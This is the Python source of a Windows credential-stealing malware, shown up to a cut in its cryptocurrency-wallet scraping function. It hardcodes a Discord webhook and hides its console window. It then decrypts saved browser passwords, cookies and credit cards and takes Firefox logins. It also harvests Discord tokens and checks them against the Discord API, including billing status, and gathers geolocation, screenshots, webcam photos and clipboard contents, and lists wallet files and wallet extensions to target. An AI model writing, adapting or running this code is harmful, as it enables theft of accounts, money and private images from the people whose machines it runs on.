import os
import sys
import json
import base64
import re
import sqlite3
import shutil
import glob
import struct
import zipfile
import io
import csv
import platform
import uuid
import socket
import subprocess
import threading
import time
import winreg
from datetime import datetime, timezone

WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1541133341569327195/Ubv083eTCQQ7BZwdQlbSGcqnXt56rhZLsJhybE_mrAyxip1XoqzJEqCwDnUKDBHy8WDz"
CHROME_BASE_BROWSERS = [
    ("Chrome", os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data")),
    ("Edge",   os.path.expandvars(r"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data")),
    ("Brave",  os.path.expandvars(r"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data")),
    ("Opera",  os.path.expandvars(r"%APPDATA%\\Opera Software\\Opera Stable")),
    ("OperaGX",os.path.expandvars(r"%LOCALAPPDATA%\\Opera Software\\Opera GX Stable")),
    ("Vivaldi",os.path.expandvars(r"%LOCALAPPDATA%\\Vivaldi\\User Data")),
    ("Yandex", os.path.expandvars(r"%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data")),
    ("Chromium", os.path.expandvars(r"%LOCALAPPDATA%\\Chromium\\User Data")),
    ("Arc",    os.path.expandvars(r"%LOCALAPPDATA%\\Packages\\TheBrowserCompany.Arc_ttt1ap7aakyb4\\LocalCache\\Local\\Arc\\User Data")),
]
FIREFOX_BASES = [
    ("Firefox", os.path.expandvars(r"%APPDATA%\\Mozilla\\Firefox\\Profiles")),
    ("LibreWolf", os.path.expandvars(r"%APPDATA%\\librewolf\\Profiles")),
    ("Waterfox", os.path.expandvars(r"%APPDATA%\\Waterfox\\Profiles")),
    ("PaleMoon", os.path.expandvars(r"%APPDATA%\\Moonchild Productions\\Pale Moon\\Profiles")),
]
WALLET_PATHS = [
    ("Exodus",        os.path.expandvars(r"%APPDATA%\\Exodus\\exodus.wallet")),
    ("Exodus Eden",   os.path.expandvars(r"%APPDATA%\\Exodus\\exodus.wallet\\passphrase.json")),
    ("Zcash",         os.path.expandvars(r"%APPDATA%\\Zcash")),
    ("Armory",        os.path.expandvars(r"%APPDATA%\\Armory")),
    ("Bytecoin",      os.path.expandvars(r"%APPDATA%\\bytecoin")),
    ("Jaxx",          os.path.expandvars(r"%APPDATA%\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb")),
    ("Exodus (App)",  os.path.expandvars(r"%LOCALAPPDATA%\\Exodus")),
    ("Electrum",      os.path.expandvars(r"%APPDATA%\\Electrum\\wallets")),
    ("Electrum-LTC",  os.path.expandvars(r"%APPDATA%\\Electrum-LTC\\wallets")),
    ("Electrum-DASH", os.path.expandvars(r"%APPDATA%\\Electrum-DASH\\wallets")),
    ("Electrum-BCH",  os.path.expandvars(r"%APPDATA%\\Electrum-BCH\\wallets")),
    ("Electrum-VTC",  os.path.expandvars(r"%APPDATA%\\Electrum-VTC\\wallets")),
    ("AtomicWallet",  os.path.expandvars(r"%APPDATA%\\atomic\\Local Storage\\leveldb")),
    ("Guarda",        os.path.expandvars(r"%APPDATA%\\Guarda\\Local Storage\\leveldb")),
    ("Coinomi",       os.path.expandvars(r"%APPDATA%\\Coinomi\\Coinomi\\wallets")),
    ("Bither",        os.path.expandvars(r"%APPDATA%\\Bither")),
    ("Coinbase",      os.path.expandvars(r"%LOCALAPPDATA%\\Coinbase\\User Data\\Default\\Local Storage\\leveldb")),
    ("Tron (TronLink)",os.path.expandvars(r"%APPDATA%\\TronLink")),
    ("MetaMask-Firefox", None),
    ("Phantom-Chrome", None),
    ("Binance-Chrome", None),
    ("Coinbase-Chrome", None),
    ("Trust-Chrome", None),
    ("Ronin-Chrome", None),
    ("Safepal-Chrome", None),
]
EXTENSION_IDS = {
    "MetaMask":      "nkbihfbeogaeaoehlefnkodbefgpgknn",
    "Phantom":       "bfnaelmomeimhlpmgjnjophhpkkoljpa",
    "Binance":       "fhbohimaelbohpjbbldcngcnapndodjp",
    "Coinbase":      "hnfanknocfeofbddgcijnmhnfnkdnaad",
    "Trust":         "egjidjbpglichdcdbnjkhplnnfcippka",
    "Ronin":         "fnjhmkhhmkbjkkabndcnnogagogbneec",
    "Safepal":       "lgmpcpglpngdoalbgeoldeajfclnhafa",
    "KuCoin":        "dlobopcgaekipgbmdlnaekojanpdfbng",
    "OKX":           "mcohilncbfahbmgdjkbpemcciiolgcge",
    "Gate":          "fbmcmoldbiblddjgbihlaoijpoioifdl",
    "Bybit":         "dldmjjpmmgipnkgflddbldpjcndekjcl",
    "Bitget":        "jiidiaalihmmhddjnbhgpiplcdikafel",
    "Kaiji":         "lgmpcpglpngdoalbgeoldeajfclnhafa",
    "Solflare":      "bhhhlbepdkbapadjdnnojkbgioiodbic",
    "Keplr":         "dmkamcknogkgcdfhhbddcghachkejeap",
    "Terra Station": "aiifbnbfobpmeekipheeijimdpnlpgpp",
    "TronLink":      "ibnejdfjmmkpcnlpebklmnkoeoihofec",
    "XDEFI":         "hmeobnopfmpcjnkldppekmjifpasinoo",
    "Gemini":        "cgehpnfjlnjpekokenfaceneglfnleog",
}
INTERESTING_EXT = [
    ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf",
    ".key", ".wallet", ".dat", ".json", ".csv", ".sqlite", ".sqlite3",
    ".psafe3", ".kwallet", ".log", ".kdbx", ".1pw", ".p12", ".pem",
    ".crt", ".csr", ".gpg", ".pgp", ".mnemonic", ".seed", ".account",
    ".bbk", ".pst", ".pcf", ".sage", ".pub", ".asc", ".scss"
]

if sys.platform == "win32":
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
try:
    import ctypes
except:
    pass

TMP = os.environ.get("TEMP") or os.environ.get("TMP") or os.path.expandvars(r"%LOCALAPPDATA%\\Temp")
STAGE_DIR = os.path.join(TMP, f"BM_{uuid.uuid4().hex[:12]}")
os.makedirs(STAGE_DIR, exist_ok=True)

SUMMARY = {
    "passwords": 0, "cookies": 0, "cards": 0, "autofill": 0,
    "history": 0, "downloads": 0, "extensions": 0, "wallets": [],
    "discord_tokens": [], "roblox": 0, "launchers": [], "apps": False,
    "files": 0, "webcam": False, "screenshot": False, "system": False,
    "clipboard": "", "discord_injection": False,
    "discord_ids": [], "discord_phones": [], "discord_emails": [],
}

def try_import(name, package=None):
    try:
        mod = __import__(name)
        return mod
    except ImportError:
        try:
            if package:
                subprocess.run([sys.executable, "-m", "pip", "install", package, "--quiet", "--no-warn-script-location"], capture_output=True, timeout=90)
            else:
                subprocess.run([sys.executable, "-m", "pip", "install", name, "--quiet", "--no-warn-script-location"], capture_output=True, timeout=90)
            mod = __import__(name)
            return mod
        except:
            return None
    except:
        return None

requests = try_import("requests", "requests")
try:
    import win32crypt
except:
    win32crypt = None
try:
    from Crypto.Cipher import AES
except:
    AES = None

# ========================================
#  UTILITIES
# ========================================
def timestamp_to_iso(ts):
    try:
        if not ts or ts == 0:
            return ""
        if ts > 1e16:
            dt = datetime(1601, 1, 1, tzinfo=timezone.utc) + (ts * 1e-6) * __import__("datetime").timedelta(microseconds=1).microseconds
            return ""
        if ts > 1e12:
            ts = ts / 1000.0
        if ts < 0:
            ts = 0
        dt = datetime.fromtimestamp(ts, tz=timezone.utc)
        return dt.strftime("%Y-%m-%d %H:%M:%S UTC")
    except:
        return ""

def chrome_date_to_str(chrome_date):
    try:
        if chrome_date == 0: return ""
        return (datetime(1601, 1, 1, tzinfo=timezone.utc) + (chrome_date / 1e6) * __import__("datetime").timedelta(seconds=1)).strftime("%Y-%m-%d %H:%M:%S UTC")
    except:
        return ""

def get_chrome_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
        encrypted_key_with_header = base64.b64decode(encrypted_key_b64)
        encrypted_key = encrypted_key_with_header[5:]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return key
    except:
        return None

def decrypt_payload(ciphertext, key):
    try:
        iv = ciphertext[3:15]
        tag = ciphertext[-16:]
        payload = ciphertext[15:-16]
        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
        decrypted = cipher.decrypt_and_verify(payload, tag)
        try:
            return decrypted.decode("utf-8", errors="replace")
        except:
            return decrypted.decode("latin-1", errors="replace")
    except:
        try:
            import ctypes
            res = win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)
            return res[1].decode("utf-8", errors="replace")
        except:
            return None

def copy_database(db_path):
    new_path = db_path + f".copy_{os.getpid()}.tmp"
    try:
        if os.path.exists(db_path):
            shutil.copy2(db_path, new_path)
            return new_path
    except:
        pass
    count = 0
    while count < 20:
        try:
            candidate = db_path + f".copy_{os.getpid()}_{count}.tmp"
            shutil.copy2(db_path, candidate)
            return candidate
        except:
            count += 1
            time.sleep(0.1)
    return None

def clean_copy(path):
    try:
        if path and os.path.exists(path):
            os.remove(path)
    except:
        pass

# ========================================
#  CHROME / EDGE / BRAVE (CHROMIUM)
# ========================================
def get_profiles(user_data_dir):
    profiles = ["Default"]
    try:
        for entry in os.listdir(user_data_dir):
            p = os.path.join(user_data_dir, entry)
            if os.path.isdir(p) and (entry.startswith("Profile ") or entry == "Default"):
                if entry not in profiles:
                    profiles.append(entry)
    except:
        pass
    return profiles

def scrape_chromium():
    all_passwords, all_cookies, all_cards = [], [], []
    all_history, all_downloads, all_extensions, all_autofill = [], [], [], []

    for name, base in CHROME_BASE_BROWSERS:
        if not os.path.isdir(base): continue
        local_state = os.path.join(base, "Local State")
        key = get_chrome_key(local_state) if os.path.exists(local_state) else None
        for profile in get_profiles(base):
            pdir = os.path.join(base, profile)
            if not os.path.isdir(pdir): continue

            # --- PASSWORDS ---
            login_db = os.path.join(pdir, "Login Data")
            if os.path.exists(login_db):
                cdb = copy_database(login_db)
                if cdb:
                    try:
                        conn = sqlite3.connect(cdb)
                        cur = conn.cursor()
                        try:
                            cur.execute("SELECT origin_url, username_value, password_value, date_created, date_password_modified, blacklisted_by_user FROM logins")
                            for origin_url, user, pwd_enc, dc, dm, black in cur.fetchall():
                                if black == 1: continue
                                pwd = decrypt_payload(pwd_enc, key) if key else None
                                if user or pwd:
                                    all_passwords.append([name, profile, origin_url or "", user or "", pwd or "", chrome_date_to_str(dc), chrome_date_to_str(dm)])
                                    SUMMARY["passwords"] += 1
                        except: pass
                        conn.close()
                    except: pass
                    clean_copy(cdb)

            # --- COOKIES ---
            cookie_db_paths = [os.path.join(pdir, "Network", "Cookies"), os.path.join(pdir, "Cookies")]
            for cookie_db in cookie_db_paths:
                if os.path.exists(cookie_db):
                    cdb = copy_database(cookie_db)
                    if cdb:
                        try:
                            conn = sqlite3.connect(cdb)
                            cur = conn.cursor()
                            try:
                                cur.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
                                for host_key, cname, enc_val, path, exp_utc, sec, http in cur.fetchall():
                                    dec = decrypt_payload(enc_val, key) if key else None
                                    if dec is None: dec = ""
                                    all_cookies.append([name, profile, host_key or "", cname or "", dec, path or "", chrome_date_to_str(exp_utc), bool(sec), bool(http)])
                                    SUMMARY["cookies"] += 1
                            except: pass
                        except: pass
                        clean_copy(cdb)

            # --- CARDS ---
            cards_db = os.path.join(pdir, "Web Data")
            if os.path.exists(cards_db):
                cdb = copy_database(cards_db)
                if cdb:
                    try:
                        conn = sqlite3.connect(cdb)
                        cur = conn.cursor()
                        try:
                            cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id FROM credit_cards")
                            for name_card, exp_month, exp_year, num_enc, _ in cur.fetchall():
                                num = decrypt_payload(num_enc, key) if key else None
                                if num:
                                    all_cards.append([name, profile, name_card or "", exp_month or "", exp_year or "", num or ""])
                                    SUMMARY["cards"] += 1
                        except: pass
                        try:
                            cur.execute("SELECT guid, name, value, value_lower FROM autofill")
                            for guid, n, v, vl in cur.fetchall():
                                if v:
                                    all_autofill.append([name, profile, n or "", v or ""])
                                    SUMMARY["autofill"] += 1
                        except: pass
                        conn.close()
                    except: pass
                    clean_copy(cdb)

            # --- HISTORY ---
            history_db = os.path.join(pdir, "History")
            if os.path.exists(history_db):
                cdb = copy_database(history_db)
                if cdb:
                    try:
                        conn = sqlite3.connect(cdb)
                        cur = conn.cursor()
                        try:
                            cur.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 2000")
                            for url, title, vc, lvt in cur.fetchall():
                                all_history.append([name, profile, url or "", (title or "")[:200], vc or 0, chrome_date_to_str(lvt)])
                                SUMMARY["history"] += 1
                        except: pass
                        try:
                            cur.execute("SELECT current_path, target_path, received_bytes, total_bytes, start_time, end_time, url, state FROM downloads ORDER BY end_time DESC LIMIT 500")
                            for cp, tp, rb, tb, st, et, url, state in cur.fetchall():
                                all_downloads.append([name, profile, url or "", cp or "", tp or "", rb or 0, tb or 0, chrome_date_to_str(st), chrome_date_to_str(et), state or 0])
                                SUMMARY["downloads"] += 1
                        except: pass
                        conn.close()
                    except: pass
                    clean_copy(cdb)

            # --- EXTENSIONS ---
            ext_dir = os.path.join(pdir, "Extensions")
            if os.path.isdir(ext_dir):
                try:
                    for ext_folder in os.listdir(ext_dir):
                        efp = os.path.join(ext_dir, ext_folder)
                        if not os.path.isdir(efp): continue
                        try:
                            versions = os.listdir(efp)
                            latest = sorted(versions)[-1] if versions else ""
                            manifest_path = os.path.join(efp, latest, "manifest.json")
                            ext_name = ext_folder
                            ext_ver = latest
                            ext_desc = ""
                            ext_perms = []
                            if os.path.exists(manifest_path):
                                try:
                                    with open(manifest_path, "r", encoding="utf-8", errors="ignore") as mf:
                                        m = json.load(mf)
                                    ext_name = m.get("name", ext_name)
                                    ext_ver = m.get("version", ext_ver)
                                    ext_desc = (m.get("description", "") or "")[:200]
                                    perms = m.get("permissions", [])
                                    if isinstance(perms, list):
                                        ext_perms = [str(p) for p in perms if isinstance(p, str)]
                                except:
                                    pass
                            wallet_type = None
                            for wname, wid in EXTENSION_IDS.items():
                                if wid.lower() == ext_folder.lower():
                                    wallet_type = wname
                                    if wname not in SUMMARY["wallets"]:
                                        SUMMARY["wallets"].append(wname)
                            all_extensions.append([name, profile, ext_folder, ext_name, ext_ver, ext_desc, ",".join(ext_perms[:20]), wallet_type or ""])
                            SUMMARY["extensions"] += 1
                        except:
                            continue
                except:
                    pass

    return all_passwords, all_cookies, all_cards, all_autofill, all_history, all_downloads, all_extensions

# ========================================
#  FIREFOX
# ========================================
def scrape_firefox():
    all_passwords, all_cookies, all_history, all_downloads = [], [], [], []
    for name, base in FIREFOX_BASES:
        if not os.path.isdir(base): continue
        for profile in os.listdir(base):
            pdir = os.path.join(base, profile)
            if not os.path.isdir(pdir): continue

            # Cookies
            cookie_db = os.path.join(pdir, "cookies.sqlite")
            if os.path.exists(cookie_db):
                cdb = copy_database(cookie_db)
                if cdb:
                    try:
                        conn = sqlite3.connect(cdb)
                        cur = conn.cursor()
                        try:
                            cur.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies")
                            for host, cname, val, path, exp, sec, http in cur.fetchall():
                                all_cookies.append([name, profile, host or "", cname or "", val or "", path or "", timestamp_to_iso(exp), bool(sec), bool(http)])
                                SUMMARY["cookies"] += 1
                        except: pass
                        conn.close()
                    except: pass
                    clean_copy(cdb)

            # History
            places_db = os.path.join(pdir, "places.sqlite")
            if os.path.exists(places_db):
                cdb = copy_database(places_db)
                if cdb:
                    try:
                        conn = sqlite3.connect(cdb)
                        cur = conn.cursor()
                        try:
                            cur.execute("SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 2000")
                            for url, title, vc, lvd in cur.fetchall():
                                all_history.append([name, profile, url or "", (title or "")[:200], vc or 0, timestamp_to_iso(lvd/1e6 if lvd else 0)])
                                SUMMARY["history"] += 1
                        except: pass
                        try:
                            cur.execute("SELECT place_id, content, dateAdded FROM moz_annos WHERE anno_attribute_id=1 ORDER BY dateAdded DESC LIMIT 500")
                            for pid, content, da in cur.fetchall():
                                try:
                                    url = ""
                                    cur2 = conn.cursor()
                                    cur2.execute("SELECT url FROM moz_places WHERE id=?", (pid,))
                                    r = cur2.fetchone()
                                    if r: url = r[0]
                                    all_downloads.append([name, profile, url or "", content or "", "", os.path.getsize(content) if content and os.path.exists(content) else 0, 0, timestamp_to_iso(da/1e6 if da else 0), timestamp_to_iso(da/1e6 if da else 0), 1])
                                    SUMMARY["downloads"] += 1
                                except: pass
                        except: pass
                        conn.close()
                    except: pass
                    clean_copy(cdb)

            # Passwords (key4.db + logins.json)
            logins_json = os.path.join(pdir, "logins.json")
            key4 = os.path.join(pdir, "key4.db")
            if os.path.exists(logins_json):
                try:
                    with open(logins_json, "r", encoding="utf-8", errors="ignore") as lj:
                        logins_data = json.load(lj)
                    for login in logins_data.get("logins", []):
                        hostname = login.get("hostname", "")
                        user = login.get("encryptedUsername", "")
                        pwd = login.get("encryptedPassword", "")
                        dc = login.get("timeCreated", 0)
                        dm = login.get("timePasswordChanged", 0)
                        user_dec = None
                        pwd_dec = None
                        try:
                            user_raw = base64.b64decode(user) if user else b""
                            pwd_raw = base64.b64decode(pwd) if pwd else b""
                            if win32crypt:
                                try:
                                    user_dec = win32crypt.CryptUnprotectData(user_raw, None, None, None, 0)[1].decode("utf-8", errors="replace")
                                    pwd_dec = win32crypt.CryptUnprotectData(pwd_raw, None, None, None, 0)[1].decode("utf-8", errors="replace")
                                except: pass
                        except: pass
                        if user_dec or pwd_dec:
                            all_passwords.append([name, profile, hostname, user_dec or "", pwd_dec or "", timestamp_to_iso(dc/1000 if dc else 0), timestamp_to_iso(dm/1000 if dm else 0)])
                            SUMMARY["passwords"] += 1
                except: pass

    return all_passwords, all_cookies, all_history, all_downloads

# ========================================
#  DISCORD TOKENS
# ========================================
def scrape_discord():
    tokens = set()
    paths = [
        ("Discord",          os.path.expandvars(r"%APPDATA%\\discord\\Local Storage\\leveldb")),
        ("DiscordCanary",    os.path.expandvars(r"%APPDATA%\\discordcanary\\Local Storage\\leveldb")),
        ("DiscordPTB",       os.path.expandvars(r"%APPDATA%\\discordptb\\Local Storage\\leveldb")),
        ("DiscordDevelopment",os.path.expandvars(r"%APPDATA%\\discorddevelopment\\Local Storage\\leveldb")),
        ("Lightcord",        os.path.expandvars(r"%APPDATA%\\Lightcord\\Local Storage\\leveldb")),
        ("Opera",            os.path.expandvars(r"%APPDATA%\\Opera Software\\Opera Stable\\Local Storage\\leveldb")),
        ("OperaGX",          os.path.expandvars(r"%LOCALAPPDATA%\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb")),
        ("Chrome",           os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb")),
        ("Edge",             os.path.expandvars(r"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb")),
        ("Brave",            os.path.expandvars(r"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb")),
        ("Yandex",           os.path.expandvars(r"%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb")),
        ("Vivaldi",          os.path.expandvars(r"%LOCALAPPDATA%\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb")),
    ]

    pattern_new = re.compile(rb'dQw4w9WgXcQ:[^.*\x00\']*')
    pattern_new_plain = re.compile(r'[\w-]{24,26}\.[\w-]{6,7}\.[\w-]{27,}')
    pattern_mfa = re.compile(r'mfa\.[\w-]{84}')

    for client_name, path in paths:
        if not os.path.isdir(path): continue
        key = None
        ls_path = os.path.normpath(os.path.join(path, "..", "..", "Local State"))
        if not os.path.exists(ls_path):
            # browser level
            base_parts = os.path.normpath(path).split(os.sep)
            for depth in range(len(base_parts) - 1, 1, -1):
                candidate = os.path.join(os.sep.join(base_parts[:depth]), "Local State")
                if os.path.exists(candidate):
                    ls_path = candidate
                    break
        if os.path.exists(ls_path):
            key = get_chrome_key(ls_path)

        for file in os.listdir(path):
            if not (file.endswith(".log") or file.endswith(".ldb")): continue
            fp = os.path.join(path, file)
            try:
                with open(fp, "rb") as f:
                    data = f.read()
            except:
                continue

            # Encrypted tokens (discord v2)
            for match in pattern_new.findall(data):
                try:
                    raw = match[len(b"dQw4w9WgXcQ:"):]
                    if raw.endswith(b"'"): raw = raw[:-1]
                    if raw.endswith(b'"'): raw = raw[:-1]
                    try:
                        raw_bytes = base64.b64decode(raw)
                    except:
                        continue
                    if key:
                        dec = decrypt_payload(raw_bytes, key)
                        if dec and dec.count(".") >= 2 and len(dec) > 40:
                            tokens.add((client_name, dec.strip(), True))
                except:
                    continue

            try:
                text = data.decode("utf-8", errors="ignore")
            except:
                continue
            for m in pattern_mfa.findall(text):
                tokens.add((client_name, m.strip(), False))
            for m in pattern_new_plain.findall(text):
                tokens.add((client_name, m.strip(), False))

    # Validate + enrich with Discord API
    enriched = []
    seen = set()
    for client, token, is_enc in tokens:
        try:
            base_part = token.split(".")[0] + "=="
            uid = base64.b64decode(base_part).decode("utf-8", errors="ignore")
        except:
            uid = ""
        identifier = (uid, token[:20])
        if identifier in seen: continue
        seen.add(identifier)

        info = {"id": uid, "email": "", "phone": "", "username": "", "discriminator": "",
                "avatar": "", "mfa_enabled": False, "premium_type": 0, "verified": False,
                "flags": 0, "locale": "", "nitro": False, "billing": False,
                "client": client, "token": token}
        if requests:
            try:
                r = requests.get("https://discordapp.com/api/v9/users/@me",
                                 headers={"Authorization": token, "Content-Type": "application/json"},
                                 timeout=15)
                if r.status_code == 200:
                    try:
                        d = r.json()
                        info["id"] = d.get("id", info["id"])
                        info["email"] = d.get("email", "") or ""
                        info["phone"] = d.get("phone", "") or ""
                        info["username"] = d.get("username", "") or ""
                        info["discriminator"] = d.get("discriminator", "") or ""
                        info["avatar"] = d.get("avatar", "") or ""
                        info["mfa_enabled"] = bool(d.get("mfa_enabled", False))
                        info["premium_type"] = int(d.get("premium_type", 0) or 0)
                        info["verified"] = bool(d.get("verified", False))
                        info["flags"] = int(d.get("flags", 0) or 0)
                        info["locale"] = d.get("locale", "") or ""
                        info["nitro"] = info["premium_type"] > 0
                        # Billing check
                        try:
                            r2 = requests.get("https://discordapp.com/api/v9/users/@me/billing/payment-sources",
                                              headers={"Authorization": token}, timeout=15)
                            if r2.status_code == 200 and r2.json():
                                info["billing"] = True
                        except: pass
                    except: pass
            except: pass

        enriched.append(info)
        if info["id"] and info["id"] not in SUMMARY["discord_ids"]:
            SUMMARY["discord_ids"].append(info["id"])
        if info["phone"] and info["phone"] not in SUMMARY["discord_phones"]:
            SUMMARY["discord_phones"].append(info["phone"])
        if info["email"] and info["email"] not in SUMMARY["discord_emails"]:
            SUMMARY["discord_emails"].append(info["email"])

    SUMMARY["discord_tokens"] = enriched
    return enriched

# ========================================
#  SYSTEM INFO + GEO-IP
# ========================================
def get_system_info():
    sysinfo = {}
    try:
        sysinfo["hostname"] = socket.gethostname()
    except: sysinfo["hostname"] = "unknown"
    try:
        sysinfo["username"] = os.getenv("USERNAME") or os.getenv("USER") or "unknown"
    except: sysinfo["username"] = "unknown"
    try:
        sysinfo["os"] = f"{platform.system()} {platform.release()} {platform.version()}"
    except: sysinfo["os"] = "unknown"
    try:
        sysinfo["arch"] = platform.machine() or "unknown"
    except: sysinfo["arch"] = "unknown"
    try:
        sysinfo["cpu"] = platform.processor() or "unknown"
    except: sysinfo["cpu"] = "unknown"
    try:
        psutil_mod = try_import("psutil", "psutil")
        if psutil_mod:
            sysinfo["cpu_cores"] = psutil_mod.cpu_count(logical=True) or 0
            mem = psutil_mod.virtual_memory()
            sysinfo["ram_total_gb"] = round(mem.total / (1024**3), 2)
            sysinfo["ram_used_gb"] = round(mem.used / (1024**3), 2)
            drives = []
            for part in psutil_mod.disk_partitions():
                try:
                    usage = psutil_mod.disk_usage(part.mountpoint)
                    drives.append({"device": part.device, "mount": part.mountpoint,
                                   "total_gb": round(usage.total/(1024**3),2),
                                   "used_gb": round(usage.used/(1024**3),2)})
                except: pass
            sysinfo["drives"] = drives
            try:
                nets = psutil_mod.net_if_addrs()
                sysinfo["local_ips"] = []
                for iface, addrs in nets.items():
                    for addr in addrs:
                        if addr.family == socket.AF_INET and not addr.address.startswith("127."):
                            sysinfo["local_ips"].append({"iface": iface, "ip": addr.address})
            except: pass
            try:
                sysinfo["gpu"] = ""
                try:
                    nvidia = subprocess.run(["nvidia-smi", "--query-gpu=name,memory.total,driver_version",
                                             "--format=csv,noheader"], capture_output=True, text=True, timeout=8)
                    if nvidia.returncode == 0 and nvidia.stdout.strip():
                        sysinfo["gpu"] = nvidia.stdout.strip()
                except: pass
            except: pass
    except: pass
    try:
        sysinfo["hwid"] = str(uuid.UUID(int=uuid.getnode())).upper()
    except:
        try:
            sysinfo["hwid"] = subprocess.check_output("wmic csproduct get uuid", text=True, timeout=10).split("\n")[1].strip()
        except: sysinfo["hwid"] = ""
    try:
        import getmac
        sysinfo["mac"] = getmac.get_mac_address()
    except:
        try:
            sysinfo["mac"] = ":".join(["%02x" % ((uuid.getnode() >> elements) & 0xff) for elements in range(0,8*6,8)][::-1])
        except: sysinfo["mac"] = ""

    sysinfo["public_ip"] = ""
    sysinfo["country"] = ""
    sysinfo["region"] = ""
    sysinfo["city"] = ""
    sysinfo["zip"] = ""
    sysinfo["isp"] = ""
    sysinfo["timezone"] = ""
    sysinfo["lat"] = ""
    sysinfo["lon"] = ""
    if requests:
        for api in ["https://ipinfo.io/json", "https://ipapi.co/json/", "https://api.myip.com/", "https://api.ipify.org?format=json"]:
            try:
                r = requests.get(api, timeout=10)
                if r.status_code == 200:
                    d = r.json()
                    if api.endswith("ipinfo.io/json"):
                        sysinfo["public_ip"] = d.get("ip", sysinfo["public_ip"])
                        sysinfo["country"] = d.get("country", sysinfo["country"])
                        sysinfo["region"] = d.get("region", sysinfo["region"])
                        sysinfo["city"] = d.get("city", sysinfo["city"])
                        sysinfo["zip"] = d.get("postal", sysinfo["zip"])
                        sysinfo["isp"] = d.get("org", sysinfo["isp"])
                        sysinfo["timezone"] = d.get("timezone", sysinfo["timezone"])
                        loc = d.get("loc", "")
                        if "," in loc:
                            ll = loc.split(",")
                            sysinfo["lat"] = ll[0]
                            sysinfo["lon"] = ll[1]
                        break
                    elif api.endswith("ipapi.co/json/"):
                        sysinfo["public_ip"] = d.get("ip", sysinfo["public_ip"]) or sysinfo["public_ip"]
                        sysinfo["country"] = d.get("country_name", sysinfo["country"]) or sysinfo["country"]
                        sysinfo["region"] = d.get("region", sysinfo["region"]) or sysinfo["region"]
                        sysinfo["city"] = d.get("city", sysinfo["city"]) or sysinfo["city"]
                        sysinfo["zip"] = d.get("postal", sysinfo["zip"]) or sysinfo["zip"]
                        sysinfo["isp"] = d.get("org", sysinfo["isp"]) or sysinfo["isp"]
                        sysinfo["timezone"] = d.get("timezone", sysinfo["timezone"]) or sysinfo["timezone"]
                        if not sysinfo["lat"]: sysinfo["lat"] = d.get("latitude", "")
                        if not sysinfo["lon"]: sysinfo["lon"] = d.get("longitude", "")
                        if sysinfo["public_ip"]: break
                    elif api.endswith("myip.com/"):
                        if not sysinfo["public_ip"]: sysinfo["public_ip"] = d.get("ip", "")
                        if not sysinfo["country"]: sysinfo["country"] = d.get("cc", "")
                        if sysinfo["public_ip"] and sysinfo["country"]: break
                    else:
                        if not sysinfo["public_ip"]: sysinfo["public_ip"] = d.get("ip", "")
            except: continue

    SUMMARY["system"] = True
    return sysinfo

# ========================================
#  SCREENSHOT
# ========================================
def take_screenshot():
    out_path = os.path.join(STAGE_DIR, "screenshot.png")
    try:
        PIL = try_import("PIL", "Pillow")
        if PIL:
            ImageGrab = __import__("PIL.ImageGrab", fromlist=["grab"]).grab
            img = ImageGrab()
            img.save(out_path, "PNG", optimize=True, quality=85)
            SUMMARY["screenshot"] = True
            return out_path
    except: pass
    try:
        import pyautogui
        s = pyautogui.screenshot()
        s.save(out_path)
        SUMMARY["screenshot"] = True
        return out_path
    except: pass
    return None

# ========================================
#  WEBCAM
# ========================================
def take_webcam():
    out_path = os.path.join(STAGE_DIR, "webcam.jpg")
    try:
        cv2 = try_import("cv2", "opencv-python")
        if not cv2: return None
        cam = None
        for idx in [0, 1, 2]:
            try:
                cam = cv2.VideoCapture(idx)
                if cam.isOpened(): break
            except: cam = None
        if cam is None or not cam.isOpened():
            return None
        for _ in range(5):
            cam.read()
            time.sleep(0.1)
        ret, frame = cam.read()
        cam.release()
        if ret and frame is not None:
            cv2.imwrite(out_path, frame, [int(cv2.IMWRITE_JPEG_QUALITY), 90])
            SUMMARY["webcam"] = True
            return out_path
    except: pass
    return None

# ========================================
#  CLIPBOARD
# ========================================
def get_clipboard():
    text = ""
    try:
        from tkinter import Tk
        root = Tk()
        root.withdraw()
        try:
            text = root.clipboard_get()
        except: text = ""
        root.destroy()
    except: pass
    try:
        if not text and win32clipboard:
            import win32clipboard
            win32clipboard.OpenClipboard()
            try:
                data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
                if data: text = data
            except: pass
            win32clipboard.CloseClipboard()
    except: pass
    if len(text) > 50000: text = text[:50000] + "\n...[truncated]"
    SUMMARY["clipboard"] = text
    return text

try:
    import win32clipboard
except: win32clipboard = None

# ========================================
#  WALLETS (files + leveldb)
# ========================================
def scrape_wallets():
    found_paths = []
    for name, path in WALLET_PATHS:
        if path is None:
            # Wallet extension wallets are counted via Extensions pass
            continue
        if not os.path.exists(path): continue
        if os.path.isdir(path):
            for root, dirs, files in os.walk(path):
                for fn in files:
                    fpath = os.path.join(root, fn)
                    try:
